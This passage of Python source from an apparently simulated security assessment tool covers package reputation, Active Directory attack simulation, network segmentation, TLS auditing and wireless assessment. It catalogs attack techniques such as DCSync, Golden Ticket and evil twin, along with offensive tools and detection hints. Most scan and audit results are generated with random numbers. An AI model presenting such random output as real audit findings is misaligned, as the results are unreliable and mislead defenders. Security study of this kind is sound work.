            'transitive_dependencies': len([d for d in dependencies if not d.get('direct', True)]),
            'findings': findings,
            'vulnerable_packages': len([f for f in findings if 'vulnerability_count' in f]),
            'risk_score': min(100, risk_score),
            'sbom_generated': True
        }
        
        self.analysis_results[analysis_id] = result
        return result
    
    def generate_sbom(self, analysis_id: str, format_type: str = 'cyclonedx') -> Dict[str, Any]:
        """Generate Software Bill of Materials."""
        analysis = self.analysis_results.get(analysis_id)
        if not analysis:
            return {'error': 'Analysis not found'}
            
        sbom = {
            'format': format_type,
            'version': '1.4' if format_type == 'cyclonedx' else '2.3',
            'generated_at': datetime.now().isoformat(),
            'tool': 'HydraRecon Supply Chain Analyzer',
            'components': analysis['total_dependencies'],
            'vulnerabilities_identified': analysis['vulnerable_packages'],
            'metadata': {
                'analysis_id': analysis_id,
                'manifest_type': analysis['manifest_type']
            }
        }
        
        return sbom
    
    def check_package_reputation(self, package_name: str, 
                                registry: str) -> Dict[str, Any]:
        """Check package reputation and trustworthiness."""
        registry_info = self.package_registries.get(registry, {})
        
        reputation = {
            'package': package_name,
            'registry': registry,
            'ecosystem': registry_info.get('ecosystem', 'Unknown'),
            'checked_at': datetime.now().isoformat(),
            'metrics': {
                'downloads_weekly': random.randint(100, 1000000),
                'github_stars': random.randint(10, 50000),
                'contributors': random.randint(1, 500),
                'last_update_days': random.randint(1, 365),
                'age_months': random.randint(6, 120)
            },
            'trust_signals': {
                'verified_publisher': random.random() > 0.5,
                'signed_releases': random.random() > 0.7,
                'security_policy': random.random() > 0.6,
                'active_maintenance': random.random() > 0.7,
                '2fa_enabled': random.random() > 0.5
            },
            'risk_indicators': [],
            'reputation_score': 0
        }
        
        # Calculate reputation score
        score = 50
        if reputation['trust_signals']['verified_publisher']:
            score += 10
        if reputation['trust_signals']['signed_releases']:
            score += 10
        if reputation['trust_signals']['security_policy']:
            score += 10
        if reputation['trust_signals']['active_maintenance']:
            score += 10
        if reputation['trust_signals']['2fa_enabled']:
            score += 10
        if reputation['metrics']['last_update_days'] > 365:
            score -= 20
            reputation['risk_indicators'].append('Potentially abandoned')
        if reputation['metrics']['contributors'] < 3:
            score -= 10
            reputation['risk_indicators'].append('Low bus factor')
        
        reputation['reputation_score'] = max(0, min(100, score))
        
        return reputation


class ActiveDirectoryAssessor:
    """Active Directory security assessment and attack simulation."""
    
    def __init__(self):
        self.ad_attacks: Dict[str, Dict[str, Any]] = {
            'kerberoasting': {
                'technique_id': 'T1558.003',
                'name': 'Kerberoasting',
                'description': 'Request service tickets and crack offline',
                'requirements': ['Domain user'],
                'tools': ['Rubeus', 'Impacket', 'PowerView'],
                'detection': 'Event ID 4769 with encryption type 0x17'
            },
            'asreproasting': {
                'technique_id': 'T1558.004',
                'name': 'AS-REP Roasting',
                'description': 'Target accounts without preauth',
                'requirements': ['User list'],
                'tools': ['Rubeus', 'Impacket'],
                'detection': 'Event ID 4768 without preauth'
            },
            'dcsync': {
                'technique_id': 'T1003.006',
                'name': 'DCSync',
                'description': 'Replicate AD to extract credentials',
                'requirements': ['Replication privileges'],
                'tools': ['Mimikatz', 'Impacket'],
                'detection': 'Event ID 4662 for replication'
            },
            'golden_ticket': {
                'technique_id': 'T1558.001',
                'name': 'Golden Ticket',
                'description': 'Forge TGT with krbtgt hash',
                'requirements': ['krbtgt hash', 'Domain SID'],
                'tools': ['Mimikatz', 'Impacket'],
                'detection': 'Ticket lifetime anomalies'
            },
            'silver_ticket': {
                'technique_id': 'T1558.002',
                'name': 'Silver Ticket',
                'description': 'Forge service ticket',
                'requirements': ['Service account hash'],
                'tools': ['Mimikatz', 'Impacket'],
                'detection': 'Event mismatch between TGS and service'
            },
            'pass_the_hash': {
                'technique_id': 'T1550.002',
                'name': 'Pass the Hash',
                'description': 'Authenticate with NTLM hash',
                'requirements': ['NTLM hash'],
                'tools': ['Mimikatz', 'Impacket', 'CrackMapExec'],
                'detection': 'Event ID 4624 type 3 with NTLM'
            },
            'pass_the_ticket': {
                'technique_id': 'T1550.003',
                'name': 'Pass the Ticket',
                'description': 'Inject Kerberos ticket',
                'requirements': ['Valid ticket'],
                'tools': ['Mimikatz', 'Rubeus'],
                'detection': 'Ticket used from unexpected location'
            },
            'skeleton_key': {
                'technique_id': 'T1556.001',
                'name': 'Skeleton Key',
                'description': 'Patch LSASS for master password',
                'requirements': ['Domain Admin'],
                'tools': ['Mimikatz'],
                'detection': 'LSASS memory modifications'
            },
            'dcshadow': {
                'technique_id': 'T1207',
                'name': 'DCShadow',
                'description': 'Register rogue DC for persistence',
                'requirements': ['Domain Admin'],
                'tools': ['Mimikatz'],
                'detection': 'New DC registration in logs'
            },
            'password_spray': {
                'technique_id': 'T1110.003',
                'name': 'Password Spraying',
                'description': 'Try common passwords against many accounts',
                'requirements': ['User list'],
                'tools': ['Spray', 'CrackMapExec'],
                'detection': 'Multiple 4771 events in short period'
            },
            'ntds_extraction': {
                'technique_id': 'T1003.003',
                'name': 'NTDS.dit Extraction',
                'description': 'Copy AD database for offline cracking',
                'requirements': ['Domain Admin or backup operator'],
                'tools': ['Ntdsutil', 'VSS', 'Secretsdump'],
                'detection': 'VSS snapshot creation, NTDS.dit access'
            },
            'constrained_delegation': {
                'technique_id': 'T1558',
                'name': 'Constrained Delegation Abuse',
                'description': 'Abuse S4U2Self/S4U2Proxy',
                'requirements': ['Account with delegation'],
                'tools': ['Rubeus', 'Impacket'],
                'detection': 'Anomalous S4U activity'
            },
            'rbcd': {
                'technique_id': 'T1558',
                'name': 'Resource-Based Constrained Delegation',
                'description': 'Abuse RBCD for privilege escalation',
                'requirements': ['WriteProperty on computer'],
                'tools': ['Rubeus', 'PowerMad', 'Impacket'],
                'detection': 'msDS-AllowedToActOnBehalfOfOtherIdentity changes'
            }
        }
        
        self.ad_misconfigs: List[Dict[str, Any]] = [
            {'name': 'Unconstrained Delegation', 'severity': 'critical'},
            {'name': 'Kerberoastable Service Accounts', 'severity': 'high'},
            {'name': 'AS-REP Roastable Accounts', 'severity': 'high'},
            {'name': 'LAPS Not Deployed', 'severity': 'high'},
            {'name': 'SMB Signing Disabled', 'severity': 'medium'},
            {'name': 'LDAP Signing Not Required', 'severity': 'medium'},
            {'name': 'Excessive Domain Admin Members', 'severity': 'high'},
            {'name': 'Stale Admin Accounts', 'severity': 'medium'},
            {'name': 'Password Policy Weak', 'severity': 'high'},
            {'name': 'GPP Passwords Present', 'severity': 'critical'},
            {'name': 'Print Spooler on DCs', 'severity': 'medium'},
            {'name': 'Machine Account Quota > 0', 'severity': 'medium'}
        ]
        
        self.assessments: Dict[str, Dict[str, Any]] = {}
        
    def create_assessment(self, domain_name: str) -> str:
        """Create a new AD security assessment."""
        assess_id = f"AD-{len(self.assessments)+1:04d}"
        
        self.assessments[assess_id] = {
            'id': assess_id,
            'domain': domain_name,
            'created_at': datetime.now().isoformat(),
            'status': 'in_progress',
            'findings': [],
            'attack_paths': [],
            'credentials_compromised': 0,
            'privileged_accounts_at_risk': 0
        }
        
        return assess_id
    
    def run_bloodhound_analysis(self, assess_id: str) -> Dict[str, Any]:
        """Simulate BloodHound-style attack path analysis."""
        if assess_id not in self.assessments:
            return {'error': 'Assessment not found'}
            
        assessment = self.assessments[assess_id]
        
        # Simulate BloodHound results
        attack_paths = []
        num_paths = random.randint(3, 15)
        
        for i in range(num_paths):
            path = {
                'id': f"PATH-{i+1:04d}",
                'start_node': random.choice([
                    'Domain Users',
                    f"user{random.randint(1,100)}@{assessment['domain']}",
                    f"svc_{random.choice(['sql', 'web', 'backup', 'admin'])}@{assessment['domain']}"
                ]),
                'end_node': random.choice([
                    'Domain Admins',
                    'Enterprise Admins',
                    f"DC01.{assessment['domain']}",
                    'krbtgt'
                ]),
                'path_length': random.randint(2, 8),
                'edges': random.sample([
                    'MemberOf', 'HasSession', 'AdminTo', 'CanRDP',
                    'CanPSRemote', 'ExecuteDCOM', 'GenericAll',
                    'WriteDacl', 'WriteOwner', 'ForceChangePassword',
                    'AddMember', 'AllExtendedRights', 'DCSync',
                    'SQLAdmin', 'CanDelegated'
                ], random.randint(2, 5)),
                'risk': random.choice(['critical', 'high', 'medium'])
            }
            attack_paths.append(path)
        
        assessment['attack_paths'] = attack_paths
        
        # Simulate misconfiguration findings
        findings = []
        for misconfig in random.sample(self.ad_misconfigs, random.randint(4, 8)):
            findings.append({
                'id': f"ADMIS-{len(findings)+1:04d}",
                'name': misconfig['name'],
                'severity': misconfig['severity'],
                'affected_count': random.randint(1, 50),
                'remediation': f"Address {misconfig['name'].lower()}"
            })
        
        assessment['findings'] = findings
        assessment['privileged_accounts_at_risk'] = random.randint(5, 30)
        assessment['status'] = 'completed'
        
        return {
            'assessment_id': assess_id,
            'domain': assessment['domain'],
            'attack_paths_found': len(attack_paths),
            'critical_paths': sum(1 for p in attack_paths if p['risk'] == 'critical'),
            'findings_count': len(findings),
            'findings_by_severity': {
                'critical': sum(1 for f in findings if f['severity'] == 'critical'),
                'high': sum(1 for f in findings if f['severity'] == 'high'),
                'medium': sum(1 for f in findings if f['severity'] == 'medium')
            },
            'privileged_accounts_at_risk': assessment['privileged_accounts_at_risk'],
            'recommendations': [
                'Implement tiered administration model',
                'Enable Protected Users group',
                'Deploy LAPS for local admin passwords',
                'Disable unnecessary delegation',
                'Enable SMB and LDAP signing'
            ]
        }
    
    def simulate_attack(self, assess_id: str, attack_type: str) -> Dict[str, Any]:
        """Simulate an AD attack technique."""
        attack_info = self.ad_attacks.get(attack_type)
        if not attack_info:
            return {'error': 'Unknown attack type'}
            
        assessment = self.assessments.get(assess_id)
        if not assessment:
            return {'error': 'Assessment not found'}
        
        # Simulate attack execution
        success = random.random() > 0.3
        
        result = {
            'attack_type': attack_type,
            'technique_id': attack_info['technique_id'],
            'name': attack_info['name'],
            'executed_at': datetime.now().isoformat(),
            'success': success,
            'requirements_met': True,
            'tools_used': random.choice(attack_info['tools']),
            'detection_events': []
        }
        
        if success:
            result['artifacts'] = {
                'credentials_obtained': random.randint(0, 10),
                'tickets_forged': 1 if 'ticket' in attack_type.lower() else 0,
                'hashes_captured': random.randint(0, 20)
            }
            result['next_steps'] = [
                'Analyze captured credentials',
                'Plan lateral movement',
                'Establish persistence'
            ]
        else:
            result['failure_reason'] = random.choice([
                'Insufficient privileges',
                'Target hardened',
                'Detection triggered',
                'Prerequisites not met'
            ])
        
        return result
    
    def generate_ad_report(self, assess_id: str) -> str:
        """Generate AD security assessment report."""
        assessment = self.assessments.get(assess_id)
        if not assessment:
            return "Assessment not found"
            
        lines = [
            "=" * 70,
            "üè¢ ACTIVE DIRECTORY SECURITY ASSESSMENT",
            "=" * 70,
            "",
            f"Domain: {assessment['domain']}",
            f"Assessment ID: {assess_id}",
            f"Date: {assessment['created_at']}",
            "",
            "üìä ASSESSMENT SUMMARY",
            "‚îÄ" * 40,
            f"   Attack Paths Identified: {len(assessment['attack_paths'])}",
            f"   Misconfigurations Found: {len(assessment['findings'])}",
            f"   Privileged Accounts at Risk: {assessment['privileged_accounts_at_risk']}",
            "",
            "üéØ CRITICAL ATTACK PATHS",
            "‚îÄ" * 40
        ]
        
        critical_paths = [p for p in assessment['attack_paths'] if p['risk'] == 'critical'][:5]
        for path in critical_paths:
            lines.append(f"   [{path['id']}] {path['start_node']} ‚Üí {path['end_node']}")
            lines.append(f"      Steps: {path['path_length']} | Edges: {', '.join(path['edges'][:3])}")
        
        lines.extend([
            "",
            "‚ö†Ô∏è KEY FINDINGS",
            "‚îÄ" * 40
        ])
        
        sev_icons = {'critical': 'üî¥', 'high': 'üü†', 'medium': 'üü°'}
        for finding in assessment['findings'][:8]:
            lines.append(f"   {sev_icons.get(finding['severity'], '‚ö™')} {finding['name']}")
            lines.append(f"      Affected: {finding['affected_count']} objects")
        
        lines.extend([
            "",
            "üìã PRIORITY REMEDIATIONS",
            "‚îÄ" * 40,
            "   1. Eliminate critical attack paths to Domain Admins",
            "   2. Address Kerberoastable service accounts",
            "   3. Implement tiered administration",
            "   4. Enable Protected Users for privileged accounts",
            "   5. Deploy credential guard on sensitive systems",
            "",
            "=" * 70
        ])
        
        return "\n".join(lines)


class NetworkSegmentationAnalyzer:
    """Analyze network segmentation and microsegmentation."""
    
    def __init__(self):
        self.zones: Dict[str, Dict[str, Any]] = {}
        self.flows: List[Dict[str, Any]] = []
        self.violations: List[Dict[str, Any]] = []
        
        self.zone_templates = {
            'dmz': {
                'name': 'DMZ',
                'trust_level': 2,
                'allowed_outbound': ['internet'],
                'typical_services': ['web', 'email', 'dns']
            },
            'internal': {
                'name': 'Internal Network',
                'trust_level': 3,
                'allowed_outbound': ['dmz', 'internet_via_proxy'],
                'typical_services': ['workstations', 'file_shares']
            },
            'servers': {
                'name': 'Server Zone',
                'trust_level': 3,
                'allowed_outbound': ['internal'],
                'typical_services': ['application_servers', 'databases']
            },
            'pci': {
                'name': 'PCI Zone',
                'trust_level': 4,
                'allowed_outbound': ['payment_processor'],
                'typical_services': ['payment_processing'],
                'compliance': 'PCI-DSS'
            },
            'management': {
                'name': 'Management Network',
                'trust_level': 5,
                'allowed_outbound': ['all_internal'],
                'typical_services': ['admin_workstations', 'jump_hosts']
            },
            'iot': {
                'name': 'IoT Network',
                'trust_level': 1,
                'allowed_outbound': ['internet_limited'],
                'typical_services': ['iot_devices', 'sensors']
            }
        }
        
    def add_zone(self, zone_type: str, name: str, 
                cidr_ranges: List[str]) -> str:
        """Add a network zone."""
        zone_id = f"ZONE-{len(self.zones)+1:04d}"
        template = self.zone_templates.get(zone_type, {})
        
        self.zones[zone_id] = {
            'id': zone_id,
            'type': zone_type,
            'name': name,
            'cidr_ranges': cidr_ranges,
            'trust_level': template.get('trust_level', 2),
            'allowed_outbound': template.get('allowed_outbound', []),
            'assets': [],
            'policies': []
        }
        
        return zone_id
    
    def add_flow(self, source_zone: str, dest_zone: str,
                protocol: str, port: int, description: str) -> str:
        """Add an allowed traffic flow."""
        flow_id = f"FLOW-{len(self.flows)+1:04d}"
        
        self.flows.append({
            'id': flow_id,
            'source_zone': source_zone,
            'dest_zone': dest_zone,
            'protocol': protocol,
            'port': port,
            'description': description,
            'created_at': datetime.now().isoformat(),
            'status': 'active'
        })
        
        return flow_id
    
    def analyze_segmentation(self) -> Dict[str, Any]:
        """Analyze current segmentation effectiveness."""
        violations = []
        recommendations = []
        
        # Check for common segmentation issues
        for zone in self.zones.values():
            # Check IoT zone isolation
            if zone['type'] == 'iot':
                for flow in self.flows:
                    if flow['source_zone'] == zone['id'] and \
                       flow['dest_zone'] in [z['id'] for z in self.zones.values() 
                                            if z['type'] in ['servers', 'pci', 'management']]:
                        violations.append({
                            'type': 'iot_to_sensitive',
                            'severity': 'high',
                            'description': f"IoT zone {zone['name']} can reach sensitive zone",
                            'flow_id': flow['id']
                        })
            
            # Check PCI zone isolation
            if zone['type'] == 'pci':
                pci_flows = [f for f in self.flows 
                            if f['source_zone'] == zone['id'] or f['dest_zone'] == zone['id']]
                if len(pci_flows) > 5:
                    violations.append({
                        'type': 'pci_over_connected',
                        'severity': 'medium',
                        'description': f"PCI zone has {len(pci_flows)} flows, consider reducing",
                        'compliance': 'PCI-DSS Req 1.3'
                    })
        
        # Generate recommendations based on analysis
        if not any(z['type'] == 'management' for z in self.zones.values()):
            recommendations.append({
                'priority': 'high',
                'recommendation': 'Implement dedicated management network',
                'rationale': 'Administrative access should be isolated'
            })
        
        # Calculate segmentation score
        total_zones = len(self.zones)
        total_flows = len(self.flows)
        violation_penalty = len([v for v in violations if v['severity'] == 'high']) * 15 + \
                           len([v for v in violations if v['severity'] == 'medium']) * 5
        
        # Higher ratio of zones to flows is better (more segmented)
        if total_flows > 0:
            ratio_score = min(50, (total_zones / total_flows) * 100)
        else:
            ratio_score = 50
            
        segmentation_score = max(0, min(100, ratio_score + 50 - violation_penalty))
        
        return {
            'zones_analyzed': total_zones,
            'flows_analyzed': total_flows,
            'violations': violations,
            'violation_count': len(violations),
            'recommendations': recommendations,
            'segmentation_score': segmentation_score,
            'maturity_level': 'Advanced' if segmentation_score >= 80 else 
                            'Intermediate' if segmentation_score >= 50 else 'Basic'
        }
    
    def generate_zone_matrix(self) -> str:
        """Generate zone communication matrix."""
        lines = [
            "=" * 70,
            "üî≤ NETWORK ZONE COMMUNICATION MATRIX",
            "=" * 70,
            ""
        ]
        
        zone_ids = list(self.zones.keys())
        zone_names = [self.zones[z]['name'][:10] for z in zone_ids]
        
        # Header row
        header = "From\\To".ljust(12) + " | " + " | ".join(n.ljust(10) for n in zone_names)
        lines.append(header)
        lines.append("-" * len(header))
        
        # Matrix rows
        for src_id in zone_ids:
            row = self.zones[src_id]['name'][:10].ljust(12) + " | "
            for dst_id in zone_ids:
                if src_id == dst_id:
                    cell = "‚îÄ".center(10)
                else:
                    flows = [f for f in self.flows 
                            if f['source_zone'] == src_id and f['dest_zone'] == dst_id]
                    if flows:
                        cell = f"‚úì({len(flows)})".center(10)
                    else:
                        cell = "‚úó".center(10)
                row += cell + " | "
            lines.append(row)
        
        lines.extend([
            "",
            "Legend: ‚úì(n) = n flows allowed | ‚úó = No flows | ‚îÄ = Same zone",
            "",
            "=" * 70
        ])
        
        return "\n".join(lines)


class CryptographyAuditor:
    """Audit cryptographic implementations and configurations."""
    
    def __init__(self):
        self.weak_algorithms: Dict[str, Dict[str, Any]] = {
            'md5': {'type': 'hash', 'status': 'broken', 'replacement': 'SHA-256'},
            'sha1': {'type': 'hash', 'status': 'deprecated', 'replacement': 'SHA-256'},
            'des': {'type': 'symmetric', 'status': 'broken', 'replacement': 'AES-256'},
            '3des': {'type': 'symmetric', 'status': 'deprecated', 'replacement': 'AES-256'},
            'rc4': {'type': 'stream', 'status': 'broken', 'replacement': 'AES-GCM'},
            'rsa_1024': {'type': 'asymmetric', 'status': 'weak', 'replacement': 'RSA-2048+'},
            'dsa': {'type': 'signature', 'status': 'deprecated', 'replacement': 'ECDSA'},
            'tls_1.0': {'type': 'protocol', 'status': 'deprecated', 'replacement': 'TLS 1.3'},
            'tls_1.1': {'type': 'protocol', 'status': 'deprecated', 'replacement': 'TLS 1.3'},
            'ssl_3.0': {'type': 'protocol', 'status': 'broken', 'replacement': 'TLS 1.3'}
        }
        
        self.cipher_suites: Dict[str, Dict[str, Any]] = {
            'TLS_AES_256_GCM_SHA384': {'tls_version': '1.3', 'security': 'strong'},
            'TLS_AES_128_GCM_SHA256': {'tls_version': '1.3', 'security': 'strong'},
            'TLS_CHACHA20_POLY1305_SHA256': {'tls_version': '1.3', 'security': 'strong'},
            'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384': {'tls_version': '1.2', 'security': 'strong'},
            'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256': {'tls_version': '1.2', 'security': 'acceptable'},
            'TLS_RSA_WITH_AES_256_CBC_SHA256': {'tls_version': '1.2', 'security': 'weak'},
            'TLS_RSA_WITH_3DES_EDE_CBC_SHA': {'tls_version': '1.2', 'security': 'broken'}
        }
        
        self.audits: Dict[str, Dict[str, Any]] = {}
        
    def audit_tls_endpoint(self, hostname: str, port: int = 443) -> Dict[str, Any]:
        """Audit TLS configuration of an endpoint."""
        audit_id = f"TLSAUDIT-{len(self.audits)+1:04d}"
        
        # Simulate TLS scan results
        supported_protocols = random.sample(['TLS 1.0', 'TLS 1.1', 'TLS 1.2', 'TLS 1.3'], 
                                           random.randint(1, 4))
        supported_ciphers = random.sample(list(self.cipher_suites.keys()), 
                                         random.randint(3, 7))
        
        findings = []
        
        # Check for deprecated protocols
        for proto in supported_protocols:
            proto_key = proto.lower().replace(' ', '_').replace('.', '_')
            if proto_key in self.weak_algorithms:
                findings.append({
                    'type': 'deprecated_protocol',
                    'severity': 'high' if self.weak_algorithms[proto_key]['status'] == 'broken' else 'medium',
                    'finding': f"{proto} is {self.weak_algorithms[proto_key]['status']}",
                    'remediation': f"Disable {proto}, use {self.weak_algorithms[proto_key]['replacement']}"
                })
        
        # Check cipher suites
        for cipher in supported_ciphers:
            cipher_info = self.cipher_suites.get(cipher, {})
            if cipher_info.get('security') in ['weak', 'broken']:
                findings.append({
                    'type': 'weak_cipher',
                    'severity': 'high' if cipher_info['security'] == 'broken' else 'medium',
                    'finding': f"Cipher {cipher} is {cipher_info['security']}",
                    'remediation': 'Disable this cipher suite'
                })
        
        # Check certificate
        cert_findings = {
            'key_size': random.choice([1024, 2048, 4096]),
            'signature_algorithm': random.choice(['SHA256withRSA', 'SHA1withRSA', 'SHA384withECDSA']),
            'days_until_expiry': random.randint(-30, 365),
            'san_present': random.random() > 0.1,
            'ct_logged': random.random() > 0.3
        }
        
        if cert_findings['key_size'] < 2048:
            findings.append({
                'type': 'weak_key',
                'severity': 'high',
                'finding': f"Certificate key size ({cert_findings['key_size']}) is too small",
                'remediation': 'Use RSA 2048+ or ECDSA 256+'
            })
        
        if 'SHA1' in cert_findings['signature_algorithm']:
            findings.append({
                'type': 'weak_signature',
                'severity': 'medium',
                'finding': 'Certificate uses deprecated SHA-1 signature',
                'remediation': 'Reissue certificate with SHA-256'
            })
        
        if cert_findings['days_until_expiry'] < 0:
            findings.append({
                'type': 'expired_cert',
                'severity': 'critical',
                'finding': 'Certificate has expired',
                'remediation': 'Renew certificate immediately'
            })
        elif cert_findings['days_until_expiry'] < 30:
            findings.append({
                'type': 'expiring_cert',
                'severity': 'medium',
                'finding': f"Certificate expires in {cert_findings['days_until_expiry']} days",
                'remediation': 'Plan certificate renewal'
            })
        
        # Calculate grade
        critical_count = sum(1 for f in findings if f['severity'] == 'critical')
        high_count = sum(1 for f in findings if f['severity'] == 'high')
        
        if critical_count > 0:
            grade = 'F'
        elif high_count > 2:
            grade = 'D'
        elif high_count > 0:
            grade = 'C'
        elif len(findings) > 2:
            grade = 'B'
        elif len(findings) > 0:
            grade = 'A-'
        else:
            grade = 'A+'
        
        result = {
            'audit_id': audit_id,
            'hostname': hostname,
            'port': port,
            'audited_at': datetime.now().isoformat(),
            'protocols_supported': supported_protocols,
            'cipher_suites': supported_ciphers,
            'certificate': cert_findings,
            'findings': findings,
            'grade': grade,
            'tls_1_3_supported': 'TLS 1.3' in supported_protocols,
            'pfs_supported': any('ECDHE' in c or 'DHE' in c for c in supported_ciphers),
            'hsts_enabled': random.random() > 0.3
        }
        
        self.audits[audit_id] = result
        return result
    
    def audit_key_management(self, system_name: str) -> Dict[str, Any]:
        """Audit key management practices."""
        findings = []
        
        # Simulate key management audit
        practices = {
            'key_rotation': random.random() > 0.4,
            'key_escrow': random.random() > 0.6,
            'hsm_usage': random.random() > 0.7,
            'key_logging': random.random() > 0.3,
            'separation_of_duties': random.random() > 0.5,
            'automated_rotation': random.random() > 0.6
        }
        
        if not practices['key_rotation']:
            findings.append({
                'severity': 'high',
                'finding': 'No regular key rotation policy',
                'remediation': 'Implement key rotation every 90 days'
            })
        
        if not practices['hsm_usage']:
            findings.append({
                'severity': 'medium',
                'finding': 'Keys not protected by HSM',
                'remediation': 'Consider HSM for sensitive key material'
            })
        
        if practices['key_logging']:
            findings.append({
                'severity': 'critical',
                'finding': 'Key material found in logs',
                'remediation': 'Remove key logging, implement log scrubbing'
            })
        
        return {
            'system': system_name,
            'practices_evaluated': practices,
            'findings': findings,
            'maturity_score': sum(1 for v in practices.values() if v) / len(practices) * 100,
            'recommendations': [
                'Implement automated key rotation',
                'Use hardware security modules',
                'Enable key usage auditing',
                'Implement separation of duties'
            ]
        }
    
    def generate_crypto_report(self, audit_id: str) -> str:
        """Generate cryptography audit report."""
        audit = self.audits.get(audit_id)
        if not audit:
            return "Audit not found"
            
        lines = [
            "=" * 70,
            "üîê CRYPTOGRAPHY AUDIT REPORT",
            "=" * 70,
            "",
            f"Host: {audit['hostname']}:{audit['port']}",
            f"Audit ID: {audit_id}",
            f"Date: {audit['audited_at']}",
            "",
            f"üìä OVERALL GRADE: {audit['grade']}",
            "",
            "üîí PROTOCOL SUPPORT",
            "‚îÄ" * 40
        ]
        
        for proto in audit['protocols_supported']:
            icon = '‚úÖ' if proto == 'TLS 1.3' else '‚ö†Ô∏è' if proto == 'TLS 1.2' else '‚ùå'
            lines.append(f"   {icon} {proto}")
        
        lines.extend([
            "",
            "üîë SECURITY FEATURES",
            "‚îÄ" * 40,
            f"   TLS 1.3 Support: {'‚úÖ' if audit['tls_1_3_supported'] else '‚ùå'}",
            f"   Perfect Forward Secrecy: {'‚úÖ' if audit['pfs_supported'] else '‚ùå'}",
            f"   HSTS Enabled: {'‚úÖ' if audit['hsts_enabled'] else '‚ùå'}",
            "",
            "üìú CERTIFICATE",
            "‚îÄ" * 40,
            f"   Key Size: {audit['certificate']['key_size']} bits",
            f"   Signature: {audit['certificate']['signature_algorithm']}",
            f"   Expires In: {audit['certificate']['days_until_expiry']} days",
            ""
        ])
        
        if audit['findings']:
            lines.append("‚ö†Ô∏è FINDINGS")
            lines.append("‚îÄ" * 40)
            for finding in audit['findings']:
                sev_icon = {'critical': 'üî¥', 'high': 'üü†', 'medium': 'üü°', 'low': 'üü¢'}.get(finding['severity'], '‚ö™')
                lines.append(f"   {sev_icon} [{finding['severity'].upper()}] {finding['finding']}")
        
        lines.extend([
            "",
            "=" * 70
        ])
        
        return "\n".join(lines)


class WirelessSecurityAssessor:
    """Wireless network security assessment."""
    
    def __init__(self):
        self.wireless_attacks: Dict[str, Dict[str, Any]] = {
            'evil_twin': {
                'name': 'Evil Twin Attack',
                'description': 'Create rogue AP mimicking legitimate network',
                'tools': ['hostapd', 'airbase-ng', 'wifiphisher'],
                'detection': 'Wireless IDS, certificate validation',
                'technique_id': 'T1557.002'
            },
            'deauth': {
                'name': 'Deauthentication Attack',
                'description': 'Force clients to disconnect and reconnect',
                'tools': ['aireplay-ng', 'mdk3', 'mdk4'],
                'detection': 'Deauth flood detection in WIDS',
                'technique_id': 'T1498'
            },
            'wpa_crack': {
                'name': 'WPA/WPA2 Cracking',
                'description': 'Capture handshake and crack offline',
                'tools': ['aircrack-ng', 'hashcat', 'john'],
                'detection': 'Monitor for multiple auth failures',
                'technique_id': 'T1110'
            },
            'pmkid': {
                'name': 'PMKID Attack',
                'description': 'Capture PMKID without client interaction',
                'tools': ['hcxdumptool', 'hcxtools', 'hashcat'],
                'detection': 'Difficult to detect passively',
                'technique_id': 'T1110'
            },
            'krack': {
                'name': 'KRACK Attack',
                'description': 'Key reinstallation attack on WPA2',
                'tools': ['krackattack scripts'],
                'detection': 'Patched in most modern clients',
                'cve': 'CVE-2017-13077'
            },
            'dragonblood': {
                'name': 'Dragonblood Attack',
                'description': 'WPA3 side-channel and downgrade attacks',
                'tools': ['dragonslayer', 'dragondrain'],
                'detection': 'Updated WPA3 implementations',
                'cve': 'CVE-2019-9494'
            },
            'karma': {
                'name': 'KARMA Attack',
                'description': 'Respond to probe requests for any SSID',
                'tools': ['hostapd-mana', 'airbase-ng'],
                'detection': 'Client probe monitoring',
                'technique_id': 'T1557'
            },
            'wps_attack': {
                'name': 'WPS PIN Attack',
                'description': 'Brute force WPS PIN',
                'tools': ['reaver', 'bully', 'pixiewps'],
                'detection': 'WPS lockout after failures',
                'technique_id': 'T1110.001'
            },
            'enterprise_attack': {
                'name': 'WPA-Enterprise Attack',
                'description': 'Capture and relay enterprise credentials',
                'tools': ['eaphammer', 'hostapd-wpe'],
                'detection': 'Certificate validation, RADIUS logging',
                'technique_id': 'T1557'
            }
        }
        
        self.security_protocols: Dict[str, Dict[str, Any]] = {
            'open': {'security_level': 0, 'encryption': 'none', 'recommendation': 'Never use'},
            'wep': {'security_level': 1, 'encryption': 'RC4', 'recommendation': 'Replace immediately'},
            'wpa': {'security_level': 2, 'encryption': 'TKIP', 'recommendation': 'Upgrade to WPA2/3'},
            'wpa2_personal': {'security_level': 3, 'encryption': 'AES-CCMP', 'recommendation': 'Strong password'},
            'wpa2_enterprise': {'security_level': 4, 'encryption': 'AES-CCMP', 'recommendation': 'Good choice'},
            'wpa3_personal': {'security_level': 4, 'encryption': 'SAE', 'recommendation': 'Excellent'},
            'wpa3_enterprise': {'security_level': 5, 'encryption': 'GCMP-256', 'recommendation': 'Best available'}
        }
        
        self.assessments: Dict[str, Dict[str, Any]] = {}
        
    def scan_networks(self, interface: str = 'wlan0') -> List[Dict[str, Any]]:
        """Simulate wireless network scanning."""
        networks = []
        num_networks = random.randint(5, 20)
        
        ssid_templates = ['Corporate-WiFi', 'Guest', 'IoT-Network', 'Printer-Net', 
                         'Conference-Room', 'Lab-Network', 'TestNet', 'Dev-WiFi']
        
        for i in range(num_networks):
            bssid = ':'.join(f'{random.randint(0,255):02x}' for _ in range(6))
            security = random.choice(list(self.security_protocols.keys()))
            
            network = {
                'ssid': f"{random.choice(ssid_templates)}-{random.randint(1,10)}",
                'bssid': bssid.upper(),
                'channel': random.randint(1, 11) if random.random() > 0.3 else random.randint(36, 165),
                'signal': random.randint(-90, -30),
                'security': security,
                'encryption': self.security_protocols[security]['encryption'],
                'security_level': self.security_protocols[security]['security_level'],
                'wps_enabled': random.random() > 0.6 if security.startswith('wpa') else False,
                'hidden': random.random() > 0.9,
                'clients_connected': random.randint(0, 50)
            }
            networks.append(network)
        
        return sorted(networks, key=lambda x: x['signal'], reverse=True)
    
    def assess_network(self, ssid: str, security_type: str,
                      additional_config: Dict = None) -> Dict[str, Any]:
        """Assess security of a specific wireless network."""
        assess_id = f"WIFI-{len(self.assessments)+1:04d}"
        
        security_info = self.security_protocols.get(security_type, {})
        findings = []
        
        # Check security protocol
        if security_info.get('security_level', 0) < 3:
            findings.append({
                'severity': 'critical' if security_info['security_level'] < 2 else 'high',
                'finding': f"Weak security protocol: {security_type}",
                'recommendation': security_info.get('recommendation', 'Upgrade security')
            })
        
        # Check for WPS
        if additional_config and additional_config.get('wps_enabled'):
            findings.append({
                'severity': 'medium',
